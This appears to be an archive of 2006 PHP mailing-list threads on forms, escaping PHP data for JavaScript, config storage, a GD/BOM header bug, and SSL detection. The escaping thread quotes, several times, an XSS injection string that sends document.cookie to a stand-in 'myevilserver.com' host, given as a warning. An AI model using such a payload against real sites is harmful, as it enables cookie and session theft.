Message-ID: <20060703104700.50031.qmail@web30512.mail.mud.yahoo.com>

Hi everyone,

Again, I need some help with PHP/MySQL. How do I assign a MySQL query to a button and how can make the button only pressable (or be available for "pressing") once a day?

Help will be greatly appreciated.

Hi Karl,

I think it woul be helpfull if you would describe in a little more detail
what exacly is you need.

Like, pressable once a day, by whom, everybody, an administrator, every
single user?
Is it for a major critical task, like a daily backup?

All the info is precious.

A button click in PHP (in the browser) does not send a signal like a
button click event in a gui desktop application (vb, WXWindows, qt, gtk,
tkinter, etc).  First you need an HTML form element and an input
element.  Each will have characteristics that tell the web server what
to do.  Here's some samples, spaced for easy reading:
  
<form 	name="form_page" 
	enctype="multipart/form-data" 
	action="./"
	method="post">

<input	type="submit" 
	name="btn_runquery" 
	value="Submit">

In the above case, your code needs to check the value of the button:
	if ( isset($_POST["btn_runquery"]) ) { // do stuff }

You can read up on HTML forms and other elements here:
http://www.w3.org/TR/html4/interact/forms.html

As for making it 'pressable' on a schedule.. you could 
1) always have the button available, but have the 'do stuff' check to
see if it is OK to run before it executes. 
2) have a 'button creating routine' that checks to see if it is OK to
run and either enable or disable the button whenever the form is
visited.

One idea that would work for either option.. have touching a file on
the file system the last thing in the 'do stuff' event. Then, the next
time the form is visited, your 'do stuff' or 'button creating routine'
can check the date on that touched file. If it already has today's date,
then do nothing (or disable button).  If it has yesterday's date; do
the event, and touch the file again (which gives it a new date).  It
doesn't have to be a file, it could be a record in the database.. or
anything persistent.

This is a really basic programming situation.  You might be a good
candidate for a NYPHP Training class (http://www.nyphp.com/training/).

You could also use Javascript to set up the button and use AJAX to 
start a PHP script that interacts with MySQL. You could use logic in 
your main PHP script to decide whether or not to display the button.

Karl:

A bit more information is needed.

However, if something like, this --

-- will solve your problem, I'll tell you how I did it.

Of course if you try to prevent scammers from voting more than once a 
day, the simple cookie approach Tedd used for naming babies is not 
enough. Check out "sevin", my personal favorite (and now #3 on the list) :-)

Hey, what are you doing voting more than once? You trying to screw up the results? :-)

If I was serious about securing a one vote per day thing, I would work out something a bit different. However, as I said "If something like this would solve your problem..."

If he wants something more secure, money is always a good incentive. Ya gets what's pay fer.

Hah. You'll have to go back about a month or so to see when Sevin was 
added to the list to truly appreciate the effort.   ;-)

Anyway, the point is just what several people pointed out when they 
asked for more info... the definition of    "how can [I] make the button 
only pressable (or be available for "pressing") once a day?"

For some of us, that is the script-kiddie problem that plagues PHP. It 
is easy to "adopt" a script but if you do, you adopt a set of 
assumptions (and coditions) along with it. Usually they are not obvious. 
That makes it "easy" because you don't need to think through those 
details, but it also makes it harder as you later discover those details 
are actually important. You may not be able to modify those adopted 
scripts as needed. And of course, if you never learn of the importance 
of the details, they may be out there awaiting exploitation.

I have no problem with scripts like yours, tedd, but it would be really 
useful if they came with some details of the assumptions made and links 
to tutorials that cover all the bases. Your outbound link could frame 
the issue, with the destination providing what is needed to understand 
the approach you took with that script.  Otherwise, as a list of "hot 
scripts" I could not  recommend them to anyone for fear of perpetuating 
the PHP script-kiddie problem. Clearly they serve some other purpose for 
you.

I thought Michael's reply was excellent because it addressed the 
question and provided outbound links when they are obviously needed 
here. but would it get read? I'm not sure, and especially when the 
reader could just adopt a script that looks like it works. It seems 
sooooooo easy to just go with the script, eh?

Your points are well taken.

For example, when I first put up that script, I had someone do code injections and I learned the hard way what that was about -- there was no harm done. I'm sure the person was just showing me the dangers. I think I learned -- if nothing else, I bought Chris Shiflett's PHP Security book and just about memorized it.

As for me laying out what it is I'm doing on my site, that's more documentation that I'm prepared to do at the moment. That site is actually MY collection of my scripts where I try different things and learn first hand how they work, like what happened with injection thing. It's also my repository of snip-its I've developed so I can have starting foundations for future work. I do a lot of different things.

For example, last week I was creating a CAPTCHA with sound and that was interesting. As soon as I finish testing, I'll publish it for others to review. Yesterday I just learned how to create pdf documents (that's mondo cool) and I found a client who wants me to generate some MySQL/PDF forms for him. And today, I was reading about generating Flash from php -- tomorrow, who knows?

But the point is that while I might not be as advanced as the rest of you, the site in question is for my development and not really set up for selling script-kiddie scripts.

Another point well taken.

In my defense of ignorance, I'm literally learning more each day and this is one of the ways I learn. If the poster wanted my script, or how I did it, then I would explain as best I could (as would anyone). If the poster and I are ignorant of problems beyond us, then I guess we will both will learn the hard way -- but who hasn't?

However, if your point includes that I should also refrain from commenting about things that may be beyond me, then I'm not sure as to how to respond. I believe that if you don't put your intellect at risk by demonstrating its limitations, then you don't learn.

As with all of us on the intellectual highway, we're always following someone.

Have a good 4th.

Really the best thing for what it is you have described is a Flash front end
with an AMFPHP call. IMHO.

Subject: [nycphp-talk] PHP COM class
Message-ID: <44ABE0C9.5060000@neuropunks.org>

Hello all,
For some reason I cannot use the COM class in PHP.
I just installed fresh 5.1.4 version, and when I do:

$excel_app = new COM("Excel.application") or die ("did not connect to COM");

I simply get an error saying Class COM not found.

According to php.net that class is bundled in with the distro, and that 
is the correct syntax to access it, what gives?..

Anyone had any problem with this?

Thanks!

Well, reading is actually cooler than it sounds.
Apparently, that class is only for Windows platform, according to 
php.net manual

Does anyone know about similar things for *nix?

Namely, I am trying to read Excel files (I can write them very well 
thanks to the PEAR class), and I found an Excel reader, but for some 
reason I get syntax errors in its code include file, etc.
http://sourceforge.net/projects/phpexcelreader is the one I was trying 
to use, but it doesnt work. Other things on google involve paying for 
it, hence my interest in COM class.

Does anyone know where to actually find a version of libssh2 > 0.4?
 
Im trying to compile the PECL version (the pear install will not work
either) on freebsd and keep getting the following when I phpize it ...
 
libssh2 version >= 0.4 not found
 
I even commented it out in the configure script to override it and got a
successful build but ssh2_connect() kicks out with unknown symbols.
 
Has anyone successfully use the SSH2 stream wrapper in PHP5 yet?
 
Thanks.

Subject: [nycphp-talk] Book recommendations - security,

Message-ID: <44AD274B.4000905@email.smith.edu>

Greetings,

I'm working on a project that has me thinking about purchasing one or 
two books.  The topics I'm interested in are:

1.  Security.  Discussion of practices for password storage and 
retrieval.  Transmission of data in a secure manner, e.g. encrypted, 
https, certificates, etc.  Also methods of cleaning/filtering/scrubbing 
data received from web forms.

2.  Getting up and running with object-oriented programming in PHP.

Detail:

1.  The project I am working on will allow users to create accounts.  I 
need to think about the best way to store their passwords and allow them 
to retrieve if lost, change if they so desire, etc.  As the information 
is somewhat sensitive there is a possibility I will need to be passing 
it via https vs. http.  Scrubbing and filtering the data to make sure 
nobody is intentionally or accidentally messing with my application.

2.  To date I have been working primarily with procedural programming 
techniques.  I am considering the benefits of object-oriented code for 
this project.  Ideally the book would include a discussion of benefits 
of using object-oriented code.

Thanks,

-Aaron

For 1 Id highly recommend Chris Shifflet's book Essential PHP Security
...

http://phpsecurity.org/

There are a few free chapters there ... 

For your second question it would probably be worth while to check out a
few open source PHP frameworks like CakePHP or Symfony + look over there
techniques and hop on the mailing lists and post a few specific
questions, a good example is the Security component in CakePHP, much of
your "filtering" and "sanitizing" should be something you should not
have to code up yourself.  

Also a good resource is http://www.owasp.org

There are so many books out there, here's a couple I have read and
enjoyed.

For security, I enjoyed Essential PHP Security by Chris Shiflett
(O'Reilly) as well as Php|architect's Guide to PHP Security by Ilia
Alshanetsky (APress).

And for PHP OOP, I liked PHP5 Objects, Patterns, and Practice my Matt
Zandstra (APress) as well as Beginning PHP5 by Dan Squier (wrox press)

Hope these help, Good luck

PHP in a Nutshell by O'Reilly publishing is an excellent reference guide
I've been using. I've been reading up on the object-oriented approach
myself and Paul Hudson (the author) does a really good job describing it
and using it in example programs. Paul also covers security in the book
(which I haven't got to yet) but it's a short chapter and might not go
into the depth you need. The book references Essential PHP Security
(also by O'Reilly) as a resource to go into more depth on that subject.

For security (as already enthusiastically noted): 
Essential PHP Security and Pro PHP Security.

For a refreshingly straight to the actual mechanics OOP intro, try: 
The PHP Anthology: Object Oriented PHP Solutions Vol 1 & 2 (PHP 5 Ready)
2003, Harry Fuecks, Sitepoint

This book has one of the least abstract OOP explanations I've come across in
print and 
a cadre of extensible working OOP examples.

Normally I'd keep out of this cause I'm not a reliable programmer, but I 
do need to stay up to speed and since you're looking at object php I 
have to second Jon's suggestion of looking at the symfony or cake code 
base (I like phpwact... it's just so easy to read). The code is well 
documented and many many concerned and opinionated eyeballs contribute 
to it. Of course the *discussions* are the textbook.... the code 
repository is only a static view of the momentary concensus.

Then again, you wanted to buy a book.

I always liked Wayner's "Translucent Databases" for it's different 
perspective (read his website and stuff first), John Gall's classic 
out-of-print "Systemantics" again for it's world view of robustness, and 
Shiflett's PHP book because, well, it's THE book to own on PHP security. 
It's the only "essential" book I agree is essential.

Subject: [nycphp-talk] Passing JavaScript arrays
Message-ID: <002c01c6a1dc$2b3cf4d0$0ba8a8c0@cliff>

I need to pass data from PHP to JavaScript. Without resorting to any
fancy Ajax's code, I currently build the JavaScript array variables
using PHP echoes. Is this the best method? The arrays are visible in the
HTML code. Any issues? For security, do I just escape the output like
any other variable destined for the browser?

Subject: [nycphp-talk] Local File versus DB-based configuration setting
	strategy
Message-ID: <003601c6a1dd$5926fed0$0ba8a8c0@cliff>

My config file (mainly constants and global arrays) has grown
significantly as I have shifted more and more potentially dynamic info
out of the code. However, this has opened another can of worms. I now
realize that if I migrate beyond one server, it would be very difficult
to keep the config information in synch using local files.
 
Obviously the database info can't be kept in the database, but beyond
that, most everything can. I have avoided this presuming that it would
be a huge performance hit, but perhaps not with caching.
 
What are the implementation possibilities and the pros and cons of each
strategy? Do I need to create fields in a DB for each setting or should
some sort of config setting object be serialized into/out of the
database? What are the performance and coherency issues? Other concerns?

Cliff Hirsch

Cliff:

To use a PHP variable in javascript, you create a javascript variable and then echo the value of the php variable. 

For example:

<?php
	$number = 100;
?>

<script language="javascript" type="text/javascript">
	var number = <?php echo $number; ?>;
</script>

That depends on what you're doing. Sometimes you want to pass html and sometimes you don't.

Try both and see what works for you.

If you're echoing a string from php into a javascript string var, you 
need to escape it.  Here's an example of what I'm talking about.  The 
escapeString function here is slightly modified from the one used in 
CakePHP's javascript helper:

<?php

function escapeString($string) {
   $escape = array("\r\n" => '\n', "\r" => '\n', "\n" => '\n', '"' => 
'\"', "'" => "\\'");
   return str_replace(array_keys($escape), array_values($escape), $string);
}

$string = "It's good to \"escape\" strings";

?>

<script language="javascript" type="text/javascript">
// <![CDATA[
   var string = '<?php echo escapeString($string); ?>';
   alert(string);
// ]]>
</script>

Thanks to all for the great responses -- very helpful. I've summarized
below:

It depends where its coming from and what you're using it for. For
example, I have dynamic JS array's coming from the DB that may contain
HTML, and will eventually populate drop-down menu's.  For these, I pass
through a 'js cleansing' routine to trim, remove HTML tags, convert to
UTF-8 (or whatever), remove any line-breaks and escape all quotes. But
I'd be extremely wary if your JS data is coming from GET or POST.  I can
see a variable like the following jacking a JS array:

');
location='http://myevilserver.com/steal?your_cookies='+document.cookie;
//

If you're echoing a string from php into a javascript string var, you
need to escape it. Here's an example. The escapeString function here is
slightly modified from the one used in CakePHP's javascript helper:

<?php
function escapeString($string) {
   $escape = array("\r\n" => '\n', "\r" => '\n', "\n" => '\n', '"' =>
'\"', "'" => "\\'");
   return str_replace(array_keys($escape), array_values($escape),
$string); }

$string = "It's good to \"escape\" strings";
?>

<script language="javascript" type="text/javascript">
// <![CDATA[
   var string = '<?php echo escapeString($string); ?>';
   alert(string);
// ]]>
</script>

If you don't want the JS to be inline, you can create a separate PHP
file that only outputs JavaScript code:

<script type="text/javascript" src="js.php"></script>

Just make sure js.php has the following before you start outputting
JavaScript:

header('content-type:text/javascript');

(From what I understand, Apache will by default cache .js files but
force a request for .php templates.  This may affect the chi of your
app..  man..)

Message-ID: <44AEB620.8090300@email.smith.edu>

It turns out that the issue was not related to the FPDI class.  The 
issue appears to be that the web browsers are adding extra margin space 
to the PDF.

When I view and print the PDF locally it renders as expected.  When I 
view and print the PDF through a web browser it adds a wider margin, 
thus slightly shrinking the overall size of the documents and all of 
it's contents!  (Tested on Mac and PC with Firefox, Safari and IE, all 
with the same result.)

Anyone know if there is some setting that I can manipulate that will 
prevent this browser behavior?

This may be an issue that would benefit from the front end list so I'll 
post there as well.

Another possible basic technique for the PHP to JavaScript string data
transfer. 

Once upon creating a JavaScripted slideshow that rewrote the innerHTML in
div tags to change images and their complex multi-line descriptions, I found
this ditty worked for dynamically creating the JavaScript array of
image/text/HTML data.

1) In PHP do: urlencode($str_with_HTML_and_special_chars)

2) In the JavaScript do:
replace(unescape($str_with_HTML_and_special_chars),'+',' ')

Has not choked on anything.

What kind of config settings?  Is your migration to multiple servers

First, I'd start by splitting out the global settings (consistent
across servers) from local settings (local paths, accounts, etc). If
you develop your application with events/triggers, you could then use
xml-rpc to update all of your servers from the global settings, and
keep the local settings separate.

We've done a similar setup with Joomla 1.5, so you can use xml-rpc and
register an update plugin to fire off when that event happens. I try
to avoid putting too many config settings in the database, as that
really limits your options in the event of a database failure.

It's not hard.  You can use CVS, SVN or rsync to do this.

This adds an extra database hit for every request for no good reason.  
Bad idea.

If you already have a database connection open then the extra hit is really a non-issue and 
theoretically would be faster than reading from a text file. I had the same situation where my config 
file for an application we develop grew fairly large so we put it in a database and have been happy 
with that set up. It also made it easier for us to add some of the values stored there to the admin 
tools so the client can change some of them as needed. The application is reliant on the database, so 
if it went down, the users wouldn't be able to do anything anyway and almost every page opens a 
database connection.

As far as serializing the data, I guess it depends on what information you are passing and how much 
work PHP has to do with it. I don't think you would gain too much unless it makes things easier for 
you code-wise for some reason. I don't think we are serializing any of the config info from what i can 
recall atm, but we do serialize some of the users' information for saved search queries and such so 
we can pass those values right back into PHP without having to reformat the data.

Text file?  Not what I was talking about -- nor I believe was Cliff.  
I'm talking about a PHP script, which would already be open to get the 
database configuration information anyway, so there's zero overhead.

To clarify, I didn't mean an external .txt file, simply that (unless you are using a PHP optimizer) PHP is 
stored as text and moving information via a database is _generally_ going to be more efficient -- but 
that is why I said "theoretically" :) -- I realize there are many variables depending one's server setup 
and the size of the config file.

In both cases the overhead is not exactly zero, but certainly miniscule (assuming your config file is 
not gargantuan). I was simply pointing out that (especially) if you already have a database connection 
open it is a viable solution and one that has worked for me. The fact that you have to store the 
database connection info in a PHP script does make it a bit less than optimal solution, so I certainly 
would be interested in hearing about alternatives and others' experiences. In my situation, it seemed 
to make sense and has made deployment and maintenance easier.

Hoped-for -- wishful thinking. Everything from the database username/password
to email settings to status code lookup tables (a # to a word translation) to
graph settings, among many others.

Interesting idea, albiet a bit over my head. I like the idea of limiting the
DB as single point of failure. On the other hand, a DB-intensive application
is practically useless in the event of a DB failure anyway.

Interesting approach. How big was the array? It seems like this method
might produce unreasonably long URLs if there is extensive data.

Another possible basic technique for the PHP to JavaScript string data
transfer. 

Once upon creating a JavaScripted slideshow that rewrote the innerHTML
in div tags to change images and their complex multi-line descriptions,
I found this ditty worked for dynamically creating the JavaScript array
of image/text/HTML data.

1) In PHP do: urlencode($str_with_HTML_and_special_chars)

2) In the JavaScript do:
replace(unescape($str_with_HTML_and_special_chars),'+',' ')

Has not choked on anything.

Thanks to all for the great responses -- very helpful. I've summarized
below:

> For security, do I just escape the output like any other variable
destined for the browser?

It depends where its coming from and what you're using it for. For
example, I have dynamic JS array's coming from the DB that may contain
HTML, and will eventually populate drop-down menu's.  For these, I pass
through a 'js cleansing' routine to trim, remove HTML tags, convert to
UTF-8 (or whatever), remove any line-breaks and escape all quotes. But
I'd be extremely wary if your JS data is coming from GET or POST.  I can
see a variable like the following jacking a JS array:

');
location='http://myevilserver.com/steal?your_cookies='+document.cookie;
//

If you're echoing a string from php into a javascript string var, you
need to escape it. Here's an example. The escapeString function here is
slightly modified from the one used in CakePHP's javascript helper:

<?php
function escapeString($string) {
   $escape = array("\r\n" => '\n', "\r" => '\n', "\n" => '\n', '"' =>
'\"', "'" => "\\'");
   return str_replace(array_keys($escape), array_values($escape),
$string); }

$string = "It's good to \"escape\" strings";
?>

<script language="javascript" type="text/javascript">
// <![CDATA[
   var string = '<?php echo escapeString($string); ?>';
   alert(string);
// ]]>
</script>

If you don't want the JS to be inline, you can create a separate PHP
file that only outputs JavaScript code:

<script type="text/javascript" src="js.php"></script>

Just make sure js.php has the following before you start outputting
JavaScript:

header('content-type:text/javascript');

(From what I understand, Apache will by default cache .js files but
force a request for .php templates.  This may affect the chi of your
app..  man..)

Are you referring to caching the entire site so that is displays

If so, what is the price paid for "caching"

No, I did not pass these as actual GET or POST data between web pages. This
technique was a jury-rig technique to get strings of HTML and other odd
characters safely into a client-side JavaScript array as follows: 

The data for the JavaScript slideshow array gets pulled from MySQL by PHP,
then with PHP the urlencode($db_data) step ensures that no character element
in the $db_data string (such as single-quote, double-quote, semi-colon or
backslash) gets interpreted by the JavaScript as a command that might throw
an error on the browser page.

Then in the actual JavaScript I found that the combined JavaScript
replace(unescape(<? echo $db_data ?>),'+',' ') nicely undoes the PHP
urlencoding and ensures that when JavaScript pushes a data array string into
the browser innerHTML element the string has a very high-chance of being
cross-browser compatible and the display to the user is pretty.

If this was not your technology issue, then forgive me for sending up this
suggestion.

Peter

Thanks to all for the great responses -- very helpful. I've summarized
below:

> For security, do I just escape the output like any other variable
destined for the browser?

It depends where its coming from and what you're using it for. For example,
I have dynamic JS array's coming from the DB that may contain HTML, and will
eventually populate drop-down menu's.  For these, I pass through a 'js
cleansing' routine to trim, remove HTML tags, convert to UTF-8 (or
whatever), remove any line-breaks and escape all quotes. But I'd be
extremely wary if your JS data is coming from GET or POST.  I can see a
variable like the following jacking a JS array:

'); location='http://myevilserver.com/steal?your_cookies='+document.cookie;
//

If you're echoing a string from php into a javascript string var, you need
to escape it. Here's an example. The escapeString function here is slightly
modified from the one used in CakePHP's javascript helper:

<?php
function escapeString($string) {
   $escape = array("\r\n" => '\n', "\r" => '\n', "\n" => '\n', '"' => '\"',
"'" => "\\'");
   return str_replace(array_keys($escape), array_values($escape), $string);
}

$string = "It's good to \"escape\" strings";
?>

<script language="javascript" type="text/javascript">
// <![CDATA[
   var string = '<?php echo escapeString($string); ?>';
   alert(string);
// ]]>
</script>

If you don't want the JS to be inline, you can create a separate PHP file
that only outputs JavaScript code:

<script type="text/javascript" src="js.php"></script>

Just make sure js.php has the following before you start outputting
JavaScript:

header('content-type:text/javascript');

(From what I understand, Apache will by default cache .js files but force a
request for .php templates.  This may affect the chi of your app..  man..)

Actually, this make perfect sense now. The code I inherited did nothing of the
sort and your explanation leads me to believe I have just been lucky so far.

On another note, I found a PEAR library that does basicly the same thing. I
don't take advantage of PEAR often enough, but looking at the code
(HTML_Javascript) makes me realize it usually accounts for things that I won't
realize until the gene hits.

Hello all -- I'm having a problem with image creation with PHP and even
though it appears my bases are covered, I can't get it resolved. I ran
gd_info() and it appears to be alright for what I need (BTW, this is a Win
server w/ PHP5.1.4, but I've also tried it on a Linux box and got the same
results):

Array
(
    [GD Version] => bundled (2.0.28 compatible)
    [FreeType Support] => 1
    [FreeType Linkage] => with freetype
    [T1Lib Support] => 1
    [GIF Read Support] => 1
    [GIF Create Support] => 1
    [JPG Support] => 1
    [PNG Support] => 1
    [WBMP Support] => 1
    [XPM Support] =>
    [XBM Support] => 1
    [JIS-mapped Japanese Font Support] =>
)

I've tried several different code snippets and get the same result:

In Firefox:
"The image "http://example.com/scripts/test.php" cannot be displayed,
because it contains errors."

In Safari:
Nothing -- but if you right-click anywhere on the screen it gives the same
dialogue box you'd get if you right-clicked an image.

As an example of the code I've been trying, I used the one below (from
PHP.net). I've made sure there is no additional whitespace outside of the
php tags.

<?php
header("Content-type: image/png");
$im = @imagecreate(100, 50)
   or die("Cannot Initialize new GD image stream");
$background_color = imagecolorallocate($im, 255, 255, 255);
$text_color = imagecolorallocate($im, 233, 14, 91);
imagestring($im, 1, 5, 5,  "A Simple Text String", $text_color);
imagepng($im);
imagedestroy($im);
?>

Any ideas? All the similar problem/solutions I've found on Google seem to
relate to people having whitespace before the <?php tag.

thanks!

Try sending the headers at the last possible moment, i.e. just before
imagepng() so that if you do generate an error, it will display on the
page, and get rid of that @, you want to know if it is failing.

Andrew:

Your code runs "as-is" just fine -- see:

The text is a tad small, but it works.

However, having gone back to the original code and removing the '@', my
Linux server did provide a header error and a bunch of goofy characters (the
Windows box still gives "The image "..." cannot be displayed because it has
errors"). Oddly, the header call is the absolute first thing on the script
(and again -- no there's no white space prior to the <?php tag).

Here's what I'm using right now:

<?php
header("Content-type: image/png");
$im = imagecreate(100, 50) or die("Cannot Initialize new GD image stream");
$background_color = imagecolorallocate($im, 255, 255, 255);
$text_color = imagecolorallocate($im, 233, 14, 91);
imagestring($im, 1, 5, 5,  "A Simple Text String", $text_color);
imagepng($im);
imagedestroy($im);
?>

Here's what the Linux box is spitting out:

*Warning*: Cannot modify header information - headers already sent by
(output started at /home/.../public_html/test.php:1) in *
/home/.../public_html/test.php* on line *2*

What is at line 11 of 
/home/.../public_html/test.php?  How are you 
invoking this script?  The "funny" characters are 
the PNG image being displayed as ASCII.

There's nothing at line 11 -- it's only 9 lines long and there's no white
space or new lines after the closing ?>. Right now I'm calling it just by
typing the URL to the script into a browser. In the end, I'd like to call it
via an <img src="..." /> tag.

Couple of things maybe:
1) I believe, that on a few occasions I have found strange hidden invisible character(s) embedded in a file by an editor like Dreamweaver say that has caused code to break. Retype this file fresh in a new plain text file. Then change file extension as needed. Delete your old file totally from the server and then upload new. Do not overwrite.
2) If you are including this patch of PHP code by calling it from another parent PHP file, then be sure there is no white space laying around in any other file used in this task. 
3) Is there an autoprepend file directive somewhere.
4) Lastly, isn't there some documented issues that depending on your Server environment and the Browser/OS on the client-side that there can be issues where particularly IE will try to ignore mangle your headers and actually perpetuates its own, something like that. maybe try adding other headers before such as theses shown below (only samples, you need the find and fill in the exact ones that work for you):
 
header("Expires: Mon, 23 Jul 1993 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header ("Content-disposition: inline; filename=".basename($file).";");
header("Content-Transfer-Encoding: binary");
header("Content-Length: ".filesize($file));
header('Content-type: image/jpeg');
 
Things like the above can untwist this.

Still having problems -- I tried moving the header(), but it gave me the 'headers already sent' error.

I copied your script to my local machine and it worked fine.  Your 
server is telling you that it thinks there are more than 9 lines in 
your file. Make sure there are no spaces before the script also.

Then, one last thing. Isn't it also true the IE in particular still has
issues with PNG display in general again based on client side browser

What is at line 11 of

invoking this script?  The "funny" characters are 
the PNG image being displayed as ASCII.

There's nothing at line 11 -- it's only 9 lines long and there's no white
space or new lines after the closing ?>. Right now I'm calling it just by
typing the URL to the script into a browser. In the end, I'd like to call it

The "headers are already sent" because at some point, something in the
script is sending output. Try running the script  after commenting out
the header() and imagepng() lines and see if that provides a more
useful error.

I'm really not sure where this notion of "line 11" came from,
something in line 1 is sending output, which supports Sawczynec's bad
character theory.

This little snippet is a dead giveaway that the file in question is
encoded with UTF-8 including the Unicode BOM.

Therefore, PHP sees line 1 as:

???<?php

and begins the output at line 1.  Remove the Unicode BOM and you'll be fine.

That said, closing PHP tags at the end of your files can also cause
these kinds of headaches, which is why I prefer to end all my php files
with the following:

// end of script

followed by a single newline

Bingo --- that was it. I switched it to Mac OS Roman and all is well. Thanks

Message-ID: <00a001c6a74d$34b4eab0$68e4a144@Rubicon>

Assuming that I have successfully installed safe and separate PHP 4 and PHP
5 on a Unix box 
running Apache 1.3.x. And that I have included and compiled in all the
extensions/libs that I need 
under both (and that I am fully aware of the MySQL, XML and OOP support

In order to switch from PHP 4 to PHP 5, can I simply go into the Apache
httpd.conf file 
and change the directive:
"LoadModule php4_module        libexec/libphp4.so"
to
"LoadModule php5_module        libexec/libphp5.so"
 
Then do a graceful reboot on Apache.
 
So again I'm not concerned with individual scripting compatability issuews,
but do you see this strategy as 
technically sound to allow me to flip back and forth between PHP 4 and PHP
5, if I so needed?

Yeah, that would work.  Personally, I do the following:
    1. Add an additional IP address to my dev box.  In a private network this
    might be:
        192.168.0.10
        192.168.0.11
    2. Setup two apache config files that:
        - each is bound to one or more IPs explicitly, not the wildcard */0.0.0.0
        - one uses PHP4, one uses PHP5
        - each may load the same or separate vhosts... depends on what you're
          trying to accomplish.  You can do name or IP based virtual hosting. Just
          make sure the two apache's IPs don't overlap.
       These might be:
           /etc/apache2/apache2-php4.conf
           /etc/apache2/apache2-php5.conf
    3. Setup a separate init script for each - one may be the same if you left
    one config file in the original place. These might be:
           /etc/init.d/apache2-php4
           /etc/init.d/apache2-php5
    4. Start your apaches:
        /etc/init.d/apache-php4 start
        /etc/init.d/apache-php5 start
    
Voila!  Then you don't need to edit or restart anything.  You have both
environments up and running seamlessly with neither running as a CGI, etc.

PS. The same strategy could be used to run a second apache on a separate port.

HTH,
Andrew

Hi gang,

Apologies for the cross-post, however I wanted to make sure I got to
as many of you as possible.

I'm preparing the presentation and would like to know:

    Just what exactly do you want to learn from this presentation?

Feel free to spout off whatever you are looking for, as I can tailor
the presentation. This time I hope to only put two or three of you to
sleep, as opposed to the four of you when I presented Mambo last year.
 :-)

I'm expecting a mix of technical/non-technical in the audience, so it
would be great if I could better target the information that you are
hoping me to cover. Let 'em rip!

Hi,

How about architectural overview among with some info about Joomla
customization?

I believe it also might be nice to see/hear some information about
performance,flexibility and etc. in comparison with other CMSs...

ps. espresso at the front door will keep everyone awake :)

I have only used joomla one time for a task, but I found that immediately:

1) Needed to customize the menu system.
2) Had to make design changes to the template files.
   How to customize without breaking upgrade compatibility?
3) I needed to install custom modules. 
   What modules are available: shopping cart, events calendar, etc.
   Had to find where I can get them: 
   What sites? Cost/free? 
   How to install a module. 
   How to configure a module.
4) Needed to know about URL rewrite.

hi,

Comparison to Drupal? It seems to be on a roll. Also, may it be an
option to "roll your own"?  All these mega packages seems to be over
kill for me.

I would LOVE to see a Wordpress Lite, A Drupal Lite, A Joomal Lite,
osCommerce Lite, MediaWiki Lite.  On editing the mother package, I
have to wade through 100's (if not thousands) of line of code to add a
feature I'd like to see.

These applications seem to be for those that have little or no php
experience, but if you are a php hacker, it would be great to just
pull components from each package, like some monster library, and
create a new hybrid? Is anyone thinking along those lines?

Thinking it would be great to "mate", and combine all the good pieces into one.

Just another crazy idea.

thanks, ed :-)

Sure you can, you can assign different templates to different parts of a 
site...

Really? I just created a new component... about 200 lines of code...

Here's something that came up recently:

Would it be possible to import and static site into Joomla?

If so, what would be the process for doing so?

Subject: [nycphp-talk] Use php to check for ssl/https support in apache
Message-ID: <44B7E8DD.2080009@beaffinitive.com>

Hi All,

I've done a bit of searching and haven't been able to find if there's a 
means that php running on apache can determine if apache supports 
ssl/https connections.  It would be nice my app to force an https 
connection on certain pages if it is available.  Otherwise I'll have to 
do it with a manual config switch.

Running apache_get_modules() and checking for mod_ssl seems like an 
option... but doesn't work on PHP 4.4.2 w/ Apache 1.3 which a lot of 
production servers still use.  Any other ideas?

Thanks a lot,
Rob

What would happen if you file(https://www.domain.com)?
You should get a FALSE if you were not able to read the file.

Yeah... that's pretty good.  It does rely on allow_url_fopen php.ini 
being turned on, I believe.  Maybe fopen(https://www.domain.com) would 
be slightly less overhead... the overhead isn't really a big deal though 
in this situation because it's only going to be used when writing a 
config file.  Any other ideas that don't require allow_url_fopen?

Thanks a lot, N?stor.  :)

ROb,

YOu can always try using Net_Ping::ping()
read about here:
http://pear.php.net/manual/en/html/package.networking.net-ping.ping.html
It is supposed to return "returns message of the ping command"

Here is an example code:

---------------------
<?php

require_once 'Net/Ping.php' ;

$ping = new Net_Ping;
$ping->setArgs(array("count" => 5,
                     "size"  => 32,
                     "ttl"   => 512
                    )
              );
var_dump($ping->ping("example.com"));

?>
----------------

N?stor :-)

Ping only tells you that a machine is up and responding to ICMP messages 
- it won't tell you if the machine is running SSL or not.

Yeah... as Jon mentioned, phpAdsNew has had a lot of development and is 
widely used.

MaxMediaManager is a project that is rewriting phpAdsNew to have many 
more features and use more OOP and good design patterns in the code. 
The 0.3 version of MaxMediaManager is nearing a stable version, but 
still has a lot of open bug tickets.  But I've been using a version of 
it that I modified with a lot of success.

Both of those are free... they have so many features, that like Jon 
said, might be overkill for your situation.

Here are 2 ways to do it without resorting to fopen.. Only applies if 
your https is on the same server. The first is cleaner than the second, 
but neither are guaranteed to work. Use at your own risk.

function check_https() {
        ob_start();
        phpinfo(INFO_GENERAL);
        $phpinfo = ob_get_contents();
        ob_end_clean();
        $s=strpos($phpinfo,'Registered PHP Streams');
        $e=strpos($phpinfo,"\n",$s);
        if (strstr(substr($phpinfo,$s,$e-$s),'https')) {
                return TRUE;
        }
        else {
                return FALSE;
        }
}

function check_https2() {
        ob_start();

In my own app, I wrote this test (years ago) that works on the Apache servers I've used it with:

No SSL if:
   (strpos($HTTP_SERVER_VARS["SERVER_SOFTWARE"], "ssl") === FALSE)

This may sound like a dumb question but wouldn't a test for a  
specific certificate file somehow be a better sign that SSL is setup?

Like attaching a check, if (file_exists('/some/path/cert.pem')) header 
("Location: https://secure/path/");

?

The existence of that file only means that SSL *might* be setup properly.  It won't tell you that it's working right, and it certainly won't tell you that the connection you're coming in on is 
encrypted.  Lots of places that serve https also serve plain vanilla http on the same IP.  But as an additional check (for a specific cert) the above suggestion might still be useful.  As long as it's 
not the only thing you're relying on to verify the https protocol.

Apache can be started without the SSL regardless of the certificate's 
existence.
I just tested my code below and phpinfo reports https even when apache 
isn't listening on 443.
Sorry. You can toss it all out the window! :(

Its just not possible then if Apache can start SSL w/o a cert and on  
another port than 443 (although unlikely in a common setup).  I think  
the original question pertained to mod_rewriting some URLs to a  
secure port if its setup w/o a manual configuration switch, the only  
other thing I can think of is either using a low level ext, like  
PHPcap (http://alcane.newffr.com/phpcap/) or something like reading  
banners once w/ another tool ... "nmap -sV -oG - -p 443 localhost |  
egrep open" ...

More overkill but it would be the difference between if it is setup  
vs. it is running I guess :-)

There is also an alternative method on the doc page, did you check  
